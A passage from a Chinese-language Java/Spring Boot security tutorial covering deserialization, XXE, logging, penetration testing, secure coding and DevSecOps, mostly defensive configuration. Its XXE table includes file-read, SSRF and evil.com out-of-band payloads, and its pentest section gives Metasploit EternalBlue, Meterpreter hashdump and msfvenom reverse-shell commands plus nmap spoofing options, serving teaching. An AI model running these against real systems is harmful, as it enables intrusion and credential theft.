        ObjectMapper mapper = new ObjectMapper();

        // 启用白名单反序列化
        mapper.activateDefaultTyping(
            BasicPolymorphicTypeValidator.builder()
                .allowIfBaseType(Object.class)
                .allowIfSubType("com.example.domain.")
                .allowIfSubType("java.util.")
                .allowIfSubType("java.time.")
                .build(),
            ObjectMapper.DefaultTyping.NON_FINAL,
            JsonTypeInfo.As.PROPERTY
        );

        // 禁用危险特性
        mapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);
        mapper.enable(DeserializationFeature.FAIL_ON_TRAILING_TOKENS);

        return mapper;
    }
}

// 安全的反序列化ObjectInputStream
public class SecureObjectInputStream extends ObjectInputStream {

    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "java.lang.String",
        "java.lang.Integer",
        "java.lang.Long",
        "java.util.ArrayList",
        "java.util.HashMap",
        "com.example.domain."
    );

    public SecureObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String className = desc.getName();

        boolean allowed = ALLOWED_CLASSES.stream()
            .anyMatch(allowedClass -> className.equals(allowedClass)
                || className.startsWith(allowedClass));

        if (!allowed) {
            throw new InvalidClassException("反序列化未经授权的类: ", className);
        }

        return super.resolveClass(desc);
    }
}

// Fastjson安全配置
public class SecureFastjsonConfig {

    static {
        // 禁用autoType
        ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
        // 启用SafeMode
        ParserConfig.getGlobalInstance().setSafeMode(true);
    }

    public static <T> T parse(String json, Class<T> clazz) {
        return JSON.parseObject(json, clazz, Feature.IgnoreAutoType);
    }
}
```

### 11.5 FAQ

**Q1: 如何检测Java反序列化漏洞？**

A: 1) 检查是否使用了ObjectInputStream.readObject()；2) 检查Classpath中是否存在Commons Collections、XBean、Spring等Gadget库；3) 使用ysoserial工具进行检测；4) 使用Java Deserialization Scanner等静态分析工具。

**Q2: 如何防止Fastjson反序列化漏洞？**

A: 1) 升级到Fastjson2（完全重写的安全版本）；2) 如果必须使用Fastjson1，升级到最新版本并开启SafeMode；3) 禁用autoType；4) 使用白名单过滤@type。

**Q3: ObjectInputFilter如何使用？**

A: Java 9+引入了ObjectInputFilter，可以全局设置反序列化过滤器：

```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "java.lang.String;java.util.*;com.example.domain.*;!*"
);
ObjectInputFilter.Config.setSerialFilter(filter);
```

---

## 12. XXE XML外部实体注入

### 12.1 XXE原理

XXE（XML External Entity Injection）是指攻击者通过在XML中定义外部实体来读取本地文件、发起网络请求或导致DoS攻击。

```
XXE攻击流程
═══════════════════════════════════════════════════════════════════

  攻击者                    服务器
    │                        │
    │ 1.发送恶意XML         │
    │ ────────────────────→ │
    │ <?xml version="1.0"?> │
    │ <!DOCTYPE foo [       │
    │   <!ENTITY xxe SYSTEM │
    │   "file:///etc/passwd">│
    │ ]>                    │
    │ <user>                │
    │   <name>&xxe;</name>  │
    │ </user>               │
    │                        │
    │                        │ 2.XML解析器处理外部实体
    │                        │ 读取/etc/passwd内容
    │                        │
    │ 3.获取文件内容        │
    │ ←──────────────────── │
    │ <name>root:x:0:0:root │
    │ :/root:/bin/bash...</name>
    │                        │
═══════════════════════════════════════════════════════════════════
```

**XXE攻击类型：**

| 攻击类型 | Payload示例 | 效果 |
|----------|-------------|------|
| 文件读取 | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | 读取服务器本地文件 |
| SSRF | `<!ENTITY xxe SYSTEM "http://169.254.169.254/">` | 发起内网请求 |
| DoS(Billion Laughs) | 递归实体引用 | 消耗内存导致DoS |
| 参数实体 | `<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;` | 带外数据泄露 |
| UTF-7绕过 | 使用UTF-7编码的XML | 绕过WAF检测 |

### 12.2 Java XML解析器安全配置

```java
@Configuration
public class XxeSecurityConfig {

    @Bean
    public DocumentBuilderFactory secureDocumentBuilderFactory() throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // 禁用外部实体
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        return factory;
    }

    @Bean
    public SAXParserFactory secureSaxParserFactory() throws Exception {
        SAXParserFactory factory = SAXParserFactory.newInstance();

        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);

        return factory;
    }

    @Bean
    public XMLInputFactory secureXmlInputFactory() {
        XMLInputFactory factory = XMLInputFactory.newInstance();

        factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
        factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
        factory.setProperty(XMLInputFactory.IS_REPLACING_ENTITY_REFERENCES, false);

        return factory;
    }
}

@Service
public class SecureXmlParser {

    public Document parseXml(String xmlContent) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        DocumentBuilder builder = factory.newDocumentBuilder();

        // 设置自定义EntityResolver阻止外部实体
        builder.setEntityResolver((publicId, systemId) -> {
            throw new SecurityException("外部实体解析被禁止: " + systemId);
        });

        InputSource is = new InputSource(new StringReader(xmlContent));
        return builder.parse(is);
    }
}
```

### 12.3 FAQ

**Q1: 如何测试XXE漏洞？**

A: 1) 在XML请求中添加DOCTYPE声明和外部实体；2) 观察响应中是否包含实体引用的内容；3) 使用带外（OOB）技术检测：让服务器发起DNS/HTTP请求到攻击者控制的服务器。

**Q2: JSON请求是否可能存在XXE？**

A: 通常不会，但如果服务器将JSON转换为XML进行解析，则可能存在XXE。例如一些SOAP服务接受JSON输入后转为XML处理。

**Q3: disallow-doctype-decl和禁用外部实体有什么区别？**

A: disallow-doctype-decl完全禁止DOCTYPE声明，是最安全的设置；禁用外部实体允许DOCTYPE但禁止外部实体引用。建议优先使用disallow-doctype-decl。

---

## 13. 日志与安全监控

### 13.1 安全日志记录

```java
@Configuration
public class SecurityLoggingConfig {

    @Bean
    public Logger securityLogger() {
        return LoggerFactory.getLogger("SECURITY");
    }
}

@Aspect
@Component
public class SecurityAuditAspect {

    private static final Logger securityLog = LoggerFactory.getLogger("SECURITY");

    @Autowired
    private AuditLogRepository auditLogRepository;

    @Pointcut("within(@org.springframework.web.bind.annotation.RestController *)")
    public void controllerPointcut() {}

    @Around("controllerPointcut()")
    public Object auditLog(ProceedingJoinPoint joinPoint) throws Throwable {
        HttpServletRequest request =
            ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();

        String username = getCurrentUsername();
        String method = request.getMethod();
        String uri = request.getRequestURI();
        String clientIp = getClientIp(request);
        String requestId = MDC.get("requestId");

        long startTime = System.currentTimeMillis();
        Object result;
        int statusCode = 200;

        try {
            result = joinPoint.proceed();
            return result;
        } catch (AccessDeniedException e) {
            statusCode = 403;
            securityLog.warn("ACCESS_DENIED|{}|{}|{}|{}|{}|{}", requestId, username, method, uri, clientIp, e.getMessage());
            throw e;
        } catch (AuthenticationException e) {
            statusCode = 401;
            securityLog.warn("AUTH_FAILED|{}|{}|{}|{}|{}|{}", requestId, username, method, uri, clientIp, e.getMessage());
            throw e;
        } finally {
            long duration = System.currentTimeMillis() - startTime;
            securityLog.info("API_ACCESS|{}|{}|{}|{}|{}|{}|{}", requestId, username, method, uri, clientIp, statusCode, duration);
        }
    }

    private String getCurrentUsername() {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        return auth != null ? auth.getName() : "anonymous";
    }

    private String getClientIp(HttpServletRequest request) {
        String ip = request.getHeader("X-Forwarded-For");
        if (ip == null || ip.isEmpty()) {
            ip = request.getRemoteAddr();
        }
        return ip.split(",")[0].trim();
    }
}

@Entity
@Table(name = "audit_log")
public class AuditLog {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false)
    private String eventType;

    @Column(nullable = false)
    private String username;

    @Column(nullable = false)
    private String resource;

    @Column(nullable = false)
    private String action;

    private String clientIp;
    private String requestId;
    private String details;

    @Column(nullable = false)
    private LocalDateTime timestamp;

    @CreationTimestamp
    private LocalDateTime createdAt;
}
```

### 13.2 入侵检测IDS/IPS

```
IDS/IPS架构
═══════════════════════════════════════════════════════════════════

  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
  │  流量入口 │ → │  IDS检测  │ → │  IPS拦截  │ → │  业务系统 │
  │          │   │          │   │          │   │          │
  │          │   │• 模式匹配│   │• 规则匹配│   │          │
  │          │   │• 异常检测│   │• 自动阻断│   │          │
  │          │   │• 行为分析│   │• 告警通知│   │          │
  └──────────┘   └──────────┘   └──────────┘   └──────────┘
                       │
                       ▼
                ┌──────────┐
                │  SIEM    │
                │  分析平台 │
                └──────────┘

IDS类型:
- NIDS: 网络入侵检测(Snort, Suricata)
- HIDS: 主机入侵检测(OSSEC, Wazuh)
- WAF: Web应用防火墙(ModSecurity)

IPS类型:
- NIPS: 网络入侵防御
- WAF: Web应用层防御
- RASP: 运行时应用自我保护

═══════════════════════════════════════════════════════════════════
```

### 13.3 Spring Boot Actuator安全

```yaml
management:
  endpoints:
    web:
      exposure:
        include: health,info,metrics,prometheus
        exclude: shutdown,env,beans,configprops,loggers
      base-path: /actuator
  endpoint:
    health:
      show-details: when-authorized
      show-components: when-authorized
    shutdown:
      enabled: false
    env:
      enabled: false
    beans:
      enabled: false
  security:
    enabled: true
```

```java
@Configuration
public class ActuatorSecurityConfig {

    @Bean
    @Order(1)
    public SecurityFilterChain actuatorSecurityFilterChain(HttpSecurity http) throws Exception {
        http
            .securityMatcher("/actuator/**")
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/actuator/health").permitAll()
                .requestMatchers("/actuator/info").permitAll()
                .requestMatchers("/actuator/**").hasRole("MONITOR")
            )
            .httpBasic(Customizer.withDefaults())
            .csrf(csrf -> csrf.disable());
        return http.build();
    }
}
```

### 13.4 FAQ

**Q1: 安全日志应该记录哪些信息？**

A: 认证事件（登录成功/失败、MFA）、授权事件（访问拒绝、权限变更）、输入验证事件（注入尝试、非法参数）、数据访问事件（敏感数据查询、批量导出）、系统事件（配置变更、服务启停）。注意不要记录敏感数据（密码、Token）。

**Q2: 日志如何防篡改？**

A: 1) 使用只追加的存储方式；2) 对日志文件设置严格的文件权限；3) 使用哈希链或数字签名保护日志完整性；4) 将日志实时发送到远程SIEM系统。

**Q3: SIEM和IDS有什么区别？**

A: IDS专注于实时检测入侵行为；SIEM（安全信息与事件管理）是更广泛的平台，收集和分析来自多个源的日志和安全事件，提供关联分析、合规报告和事件响应功能。

---

## 14. 渗透测试方法论

### 14.1 渗透测试流程

```
渗透测试标准流程 (PTES)
═══════════════════════════════════════════════════════════════════

  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
  │ 信息收集  │ → │ 威胁建模  │ → │ 漏洞分析  │ → │ 漏洞利用  │
  │          │   │          │   │          │   │          │
  │• 被动收集│   │• 确定目标│   │• 自动扫描│   │• 漏洞验证│
  │• 主动收集│   │• 攻击路径│   │• 手动测试│   │• 权限提升│
  │• 社会工程│   │• 技术栈  │   │• 代码审查│   │• 后渗透  │
  └──────────┘   └──────────┘   └──────────┘   └──────────┘
                                                       │
  ┌──────────┐   ┌──────────┐                          │
  │ 报告编写  │ ← │ 后渗透    │ ←───────────────────────┘
  │          │   │          │
  │• 漏洞清单│   │• 数据收集│
  │• 风险评级│   │• 横向移动│
  │• 修复建议│   │• 痕迹清理│
  │• 复测计划│   │• 持久化  │
  └──────────┘   └──────────┘

═══════════════════════════════════════════════════════════════════
```

### 14.2 信息收集

**被动信息收集：**

```bash
# WHOIS查询
whois example.com

# DNS信息收集
dig example.com ANY
dig example.com AXFR @dns.example.com  # DNS区域传送
nslookup -type=any example.com

# 子域名发现
subfinder -d example.com -o subdomains.txt
amass enum -d example.com
crt.sh  # 证书透明度日志查询

# Web指纹识别
whatweb http://example.com
wappalyzer http://example.com

# 搜索引擎语法(Google Dork)
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"
inurl:wp-admin site:example.com

# Shodan搜索
shodan search "hostname:example.com"
shodan search "port:443 org:Example"

# GitHub敏感信息搜索
"example.com" password
"example.com" secret_key
"example.com" api_key
```

**主动信息收集：**

```bash
# 端口扫描
nmap -sV -sC -p- example.com          # 全端口扫描
nmap -sU -sV -p 53,161,162 example.com # UDP扫描
nmap --script vuln example.com          # 漏洞扫描脚本

# 目录扫描
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
dirb http://example.com /usr/share/wordlists/dirb/common.txt
ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Web漏洞扫描
nikto -h http://example.com
nuclei -u http://example.com -t cves/

# 技术栈识别
nmap -sV --script http-headers example.com
```

### 14.3 Nmap使用详解

```bash
# 基础扫描
nmap example.com                      # 默认扫描1000个常用端口
nmap -p- example.com                  # 扫描所有65535个端口
nmap -p 80,443,8080 example.com       # 指定端口扫描

# 扫描类型
nmap -sS example.com                  # SYN半开扫描(隐蔽)
nmap -sT example.com                  # TCP全连接扫描
nmap -sU example.com                  # UDP扫描
nmap -sA example.com                  # ACK扫描(防火墙检测)

# 服务与版本检测
nmap -sV example.com                  # 服务版本检测
nmap -sV --version-intensity 5 example.com  # 中等强度版本检测

# 操作系统检测
nmap -O example.com                   # 操作系统指纹识别
nmap -O --osscan-guess example.com    # 更积极的OS猜测

# 脚本扫描
nmap --script=default example.com     # 默认脚本
nmap --script=vuln example.com        # 漏洞检测脚本
nmap --script=http-* example.com      # HTTP相关脚本
nmap --script=ssl-heartbleed example.com  # Heartbleed检测

# 综合扫描
nmap -sS -sV -O -sC -A example.com    # 全面扫描

# 输出格式
nmap -oN scan.txt example.com         # 标准输出
nmap -oX scan.xml example.com         # XML输出
nmap -oA scan example.com             # 所有格式

# 绕过防火墙
nmap -f example.com                   # 分片扫描
nmap --data-length 24 example.com     # 添加随机数据
nmap -D RND:10 example.com            # 诱饵扫描
nmap -S spoof_ip example.com          # 源地址欺骗
```

### 14.4 Burp Suite使用

```
Burp Suite核心功能
═══════════════════════════════════════════════════════════════════

1. Proxy (代理)
   - 拦截和修改HTTP/HTTPS请求
   - 自动修改请求（匹配和替换规则）
   - 请求历史记录和搜索

2. Scanner (扫描器)
   - 主动扫描: 自动发送测试请求
   - 被动扫描: 分析已有流量
   - 漏洞报告生成

3. Intruder (入侵者)
   - Sniper: 单参数逐个测试
   - Battering ram: 所有参数同一payload
   - Pitchfork: 多参数对应位置payload
   - Cluster bomb: 多参数笛卡尔积

4. Repeater (重放器)
   - 手动修改和重发请求
   - 适合深入测试特定漏洞

5. Decoder (编解码器)
   - URL/Base64/HTML/Hex编码解码
   - 哈希计算

6. Comparer (比较器)
   - 对比两个请求/响应的差异

7. Extender (扩展)
   - BApp Store安装插件
   - 自定义Python/Java插件

═══════════════════════════════════════════════════════════════════
```

### 14.5 Metasploit使用

```bash
# 启动Metasploit
msfconsole

# 搜索exploit
search type:exploit platform:windows smb
search cve:2017-0144

# 使用exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# Meterpreter后渗透
sysinfo                    # 系统信息
getuid                     # 当前用户
getsystem                  # 提权
hashdump                   # 导出密码哈希
upload /local/file C:\\    # 上传文件
download C:\\file /local/  # 下载文件
shell                      # 进入系统shell
portfwd add -l 8080 -p 80 -r 192.168.1.200  # 端口转发
route add 192.168.2.0 255.255.255.0 1  # 内网路由

# 辅助模块
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/ssh/ssh_version

# 生成payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
```

### 14.6 FAQ

**Q1: 渗透测试和红队测试有什么区别？**

A: 渗透测试是系统化的漏洞发现和利用过程，通常在约定范围内进行，目标是发现尽可能多的漏洞；红队测试模拟真实攻击者，测试完整的攻击链和防御检测能力，通常不提前告知防守方，更接近实战。

**Q2: 黑盒测试和白盒测试怎么选？**

A: 黑盒测试从攻击者视角出发，不了解系统内部实现，更真实但效率较低；白盒测试可以查看源码和架构，效率高但不够真实。推荐灰盒测试：提供有限的系统信息，平衡真实性和效率。

**Q3: 渗透测试报告应该包含哪些内容？**

A: 执行摘要（面向管理层）、测试范围和方法、漏洞清单（含CVSS评分）、漏洞详细描述和复现步骤、风险影响分析、修复建议和优先级、复测计划。

---

## 15. 安全编码规范

### 15.1 输入验证

```java
@Component
public class InputValidator {

    private static final Pattern EMAIL_PATTERN = Pattern.compile(
        "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}\$"
    );
    private static final Pattern USERNAME_PATTERN = Pattern.compile(
        "^[a-zA-Z0-9_]{3,50}\$"
    );
    private static final Pattern PHONE_PATTERN = Pattern.compile(
        "^1[3-9]\\d{9}\$"
    );
    private static final Pattern ID_CARD_PATTERN = Pattern.compile(
        "^\\d{17}[\\dXx]\$"
    );
    private static final Pattern SAFE_STRING_PATTERN = Pattern.compile(
        "^[a-zA-Z0-9\\u4e00-\\u9fa5.,;:!?()\\s_-]+\$"
    );

    public void validateEmail(String email) {
        if (email == null || email.isEmpty()) {
            throw new IllegalArgumentException("邮箱不能为空");
        }
        if (email.length() > 254) {
            throw new IllegalArgumentException("邮箱长度超过限制");
        }
        if (!EMAIL_PATTERN.matcher(email).matches()) {
            throw new IllegalArgumentException("邮箱格式不正确");
        }
    }

    public void validateUsername(String username) {
        if (username == null || username.isEmpty()) {
            throw new IllegalArgumentException("用户名不能为空");
        }
        if (!USERNAME_PATTERN.matcher(username).matches()) {
            throw new IllegalArgumentException("用户名格式不正确: 仅允许字母、数字和下划线, 3-50个字符");
        }
    }

    public void validateLength(String input, String fieldName, int min, int max) {
        if (input == null || input.length() < min || input.length() > max) {
            throw new IllegalArgumentException(
                fieldName + "长度必须在" + min + "到" + max + "之间");
        }
    }

    public void validateRange(long value, String fieldName, long min, long max) {
        if (value < min || value > max) {
            throw new IllegalArgumentException(
                fieldName + "必须在" + min + "到" + max + "之间");
        }
    }

    public void validateEnum(String value, String fieldName, Set<String> allowedValues) {
        if (!allowedValues.contains(value)) {
            throw new IllegalArgumentException(
                fieldName + "的值不合法, 允许的值: " + allowedValues);
        }
    }

    public void validateNoPathTraversal(String input) {
        if (input != null && (input.contains("../") || input.contains("..\\")
            || input.contains("%2e%2e") || input.contains("%252e"))) {
            throw new SecurityException("检测到路径遍历攻击");
        }
    }

    public void validateNoSqlInjection(String input) {
        if (input != null) {
            String lower = input.toLowerCase();
            if (lower.contains("' or ") || lower.contains("' and ")
                || lower.contains("union select") || lower.contains("--")
                || lower.contains(";drop ") || lower.contains("1=1")) {
                throw new SecurityException("检测到潜在的SQL注入");
            }
        }
    }
}
```

### 15.2 安全配置清单

```
Spring Boot安全配置检查清单
═══════════════════════════════════════════════════════════════════

1. 应用配置
   □ 关闭调试模式: debug=false
   □ 隐藏版本信息: server.server-header=
   □ 禁用Banner: spring.main.banner-mode=off
   □ 配置安全响应头
   □ 启用HTTPS

2. Session配置
   □ 设置合理的Session超时
   □ 使用安全的Cookie属性(HttpOnly, Secure, SameSite)
   □ 防止Session Fixation攻击
   □ 限制并发Session数

3. 数据库配置
   □ 使用最小权限数据库账户
   □ 启用SSL数据库连接
   □ 禁用危险存储过程
   □ 配置连接池限制

4. 日志配置
   □ 不记录敏感数据(密码、Token)
   □ 配置日志轮转和保留策略
   □ 使用结构化日志格式
   □ 保护日志文件权限

5. Actuator配置
   □ 限制暴露的端点
   □ 端点需要认证
   □ 禁用shutdown端点
   □ 更改默认路径

6. 依赖管理
   □ 定期更新依赖版本
   □ 使用OWASP Dependency-Check
   □ 使用Dependabot自动更新
   □ 移除未使用的依赖

═══════════════════════════════════════════════════════════════════
```

### 15.3 SAST/DAST工具

```
静态/动态应用安全测试工具
═══════════════════════════════════════════════════════════════════

SAST (静态应用安全测试)
────────────────────────
┌──────────────────┬───────────────────────┬──────────────┐
│  工具名称         │      特点              │    适用语言   │
├──────────────────┼───────────────────────┼──────────────┤
│ SonarQube       │ 规则丰富,CI集成好      │ 多语言       │
│ SpotBugs        │ FindBugs继任者         │ Java         │
│ Checkmarx       │ 企业级SAST             │ 多语言       │
│ Fortify         │ 微焦点企业级           │ 多语言       │
│ Semgrep         │ 轻量级,自定义规则      │ 多语言       │
│ CodeQL          │ GitHub,语义查询        │ 多语言       │
└──────────────────┴───────────────────────┴──────────────┘

DAST (动态应用安全测试)
────────────────────────
┌──────────────────┬───────────────────────┬──────────────┐
│  工具名称         │      特点              │    适用场景   │
├──────────────────┼───────────────────────┼──────────────┤
│ OWASP ZAP       │ 开源,功能全面          │ 通用Web应用  │
│ Burp Suite Pro  │ 专业级,插件丰富        │ 专业渗透测试 │
│ Nuclei          │ 基于模板,高效          │ 批量扫描     │
│ Arachni         │ Ruby编写,支持脚本      │ 通用Web应用  │
│ Nikto           │ Web服务器专用          │ 服务器配置   │
└──────────────────┴───────────────────────┴──────────────┘

═══════════════════════════════════════════════════════════════════
```

**SonarQube集成配置：**

```xml
<plugin>
    <groupId>org.sonarsource.scanner.maven</groupId>
    <artifactId>sonar-maven-plugin</artifactId>
    <version>3.10.0.2594</version>
</plugin>
```

```yaml
# GitLab CI集成
sonarqube-check:
  stage: test
  script:
    - mvn verify sonar:sonar -Dsonar.projectKey=myproject
  only:
    - merge_requests
    - main
```

### 15.4 FAQ

**Q1: SAST和DAST应该先用哪个？**

A: 建议先在CI/CD中集成SAST（编译前扫描，成本低），再在测试环境中进行DAST（运行时扫描，发现逻辑漏洞）。两者互补，不能互相替代。

**Q2: 如何减少SAST的误报？**

A: 1) 调整规则严格度；2) 标记已知误报；3) 使用自定义规则；4) 结合代码上下文分析；5) 定期评审规则集。

**Q3: 安全编码规范如何落地？**

A: 1) 制定团队安全编码规范文档；2) 在IDE中安装安全检查插件（如SonarLint）；3) 在CI/CD中集成SAST扫描门禁；4) 定期安全代码审查；5) 安全培训。

---

## 16. DevSecOps

### 16.1 安全左移

```
安全左移 (Shift Left Security)
═══════════════════════════════════════════════════════════════════

  传统模式:                    安全左移模式:

  需求→设计→开发→测试→安全     需求→设计→开发→测试→发布
                    ↑              ↑    ↑    ↑    ↑    ↑
                  安全检查        安    安    安    安    安
                  (最晚介入)      全    全    全    全    全
                                  评审  设计  编码  测试  监控

  修复成本:                    修复成本:
  需求阶段: 1x                 需求阶段: 1x
  设计阶段: 6x                 设计阶段: 6x
  编码阶段: 15x                编码阶段: 15x
  测试阶段: 60x                自动扫描: 低成本
  生产阶段: 100x+              持续监控: 低成本

═══════════════════════════════════════════════════════════════════
```

### 16.2 CI/CD安全集成

```yaml
# 完整的DevSecOps CI/CD Pipeline
name: Secure Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  # 阶段1: 静态分析
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: SonarQube Scan
        run: mvn verify sonar:sonar
          -Dsonar.projectKey=myproject
          -Dsonar.host.url=${{ secrets.SONAR_URL }}
          -Dsonar.login=${{ secrets.SONAR_TOKEN }}
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Semgrep Scan
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/secrets
            p/owasp-top-ten

      - name: Secret Detection
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  # 阶段2: 依赖检查
  dependency-check:
    runs-on: ubuntu-latest
    needs: sast
    steps:
      - uses: actions/checkout@v4

      - name: OWASP Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 'myproject'
          path: '.'
          format: 'HTML'

      - name: Snyk Scan
        uses: snyk/actions/maven@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

  # 阶段3: 构建与容器扫描
  build-and-scan:
    runs-on: ubuntu-latest
    needs: dependency-check
    steps:
      - uses: actions/checkout@v4

      - name: Build Docker Image
        run: docker build -t myapp:latest .

      - name: Trivy Container Scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:latest'
          format: 'sarif'
          exit-code: '1'
          severity: 'CRITICAL,HIGH'

      - name: Docker Bench Security
        run: docker run --rm --net host --pid host \
          --userns host --cap-add audit_control \
          -e DOCKER_CONTENT_TRUST=\$DOCKER_CONTENT_TRUST \
          docker/docker-bench-security

      - name: Cosign Sign Image
        run: |
          cosign sign --key env://COSIGN_KEY myapp:latest
        env:
          COSIGN_KEY: ${{ secrets.COSIGN_PRIVATE_KEY }}

  # 阶段4: DAST扫描
  dast:
    runs-on: ubuntu-latest
    needs: build-and-scan
    if: github.ref == 'refs/heads/main'
    steps:
      - name: Deploy to Staging
        run: kubectl apply -f k8s/staging/

      - name: Wait for Deployment
        run: kubectl rollout status deployment/myapp -n staging

      - name: OWASP ZAP Scan
        uses: zaproxy/action-full-scan@v0.10.0
        with:
          target: 'https://staging.example.com'
          rules_file_name: 'zap-rules.tsv'
          cmd_options: '-a -j'

      - name: Nuclei Scan
        run: |
          nuclei -u https://staging.example.com \
            -t cves/ -t vulnerabilities/ \
            -severity critical,high
```

### 16.3 容器安全

```dockerfile
# 安全的Dockerfile
FROM eclipse-temurin:17-jre-alpine AS runtime

# 创建非root用户
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

# 设置工作目录
WORKDIR /app

# 复制jar文件
COPY --chown=appuser:appgroup target/*.jar app.jar

# 切换到非root用户
USER appuser

# 健康检查
HEALTHCHECK --interval=30s --timeout=3s --retries=3 \
  CMD wget -qO- http://localhost:8080/actuator/health || exit 1

# 安全相关的JVM参数
ENV JAVA_OPTS="-XX:+UseContainerSupport \
  -XX:MaxRAMPercentage=75.0 \
  -Djava.security.egd=file:/dev/./urandom \
  -Djava.net.preferIPv4Stack=true \
  -Dfile.encoding=UTF-8"

# 暴露端口
EXPOSE 8080

# 启动命令
ENTRYPOINT ["sh", "-c", "java \$JAVA_OPTS -jar app.jar"]
```

```yaml
# Kubernetes安全配置
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
    resources:
      limits:
        memory: "512Mi"
        cpu: "500m"
      requests:
        memory: "256Mi"
        cpu: "250m"
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir: {}
```

### 16.4 基础设施即代码安全

```yaml
# Terraform安全检查(tfsec)
# 在CI中运行: tfscan / checkov / tfsec

resource "aws_s3_bucket" "data" {
  bucket = "my-secure-bucket"

  versioning {
    enabled = true
  }

  server_side_encryption_configuration {
    rule {
      apply_server_side_encryption_by_default {
        sse_algorithm = "aws:kms"
      }
    }
  }

  lifecycle_rule {
    enabled = true
    noncurrent_version_expiration {
      days = 30
    }
  }
}

resource "aws_s3_bucket_public_access_block" "data" {
  bucket                  = aws_s3_bucket.data.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
```

### 16.5 FAQ

**Q1: DevSecOps如何平衡安全与开发速度？**

A: 1) 自动化安全检查，减少人工阻碍；2) 使用安全门禁而非安全审批；3) 提供安全修复的快捷方案；4) 分级处理安全发现（严重阻断，中等跟踪）；5) 持续度量安全指标。

**Q2: 容器安全的关键措施有哪些？**

A: 1) 使用最小基础镜像（如distroless）；2) 以非root用户运行；3) 只读文件系统；4) 限制Linux capabilities；5) 定期扫描镜像漏洞；6) 签名验证镜像；7) 使用网络策略限制Pod间通信。

**Q3: 如何在CI/CD中实现密钥安全？**

A: 1) 使用专用的密钥管理服务（HashiCorp Vault、AWS Secrets Manager）；2) 不在代码和配置文件中硬编码密钥；3) 使用CI/CD平台的密钥存储；4) 自动轮换密钥；5) 审计密钥访问记录。

---

## 17. 实战案例

### 17.1 综合Web应用安全加固案例

以一个Spring Boot电商系统为例，展示从0到1构建安全体系的完整过程。

```
电商系统安全架构
═══════════════════════════════════════════════════════════════════

  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
  │  CDN/WAF  │ → │  API网关  │ → │ 认证服务  │ → │ 业务服务  │
  │          │   │          │   │          │   │          │
  │• DDoS防护│   │• 限流    │   │• JWT     │   │• 输入验证│
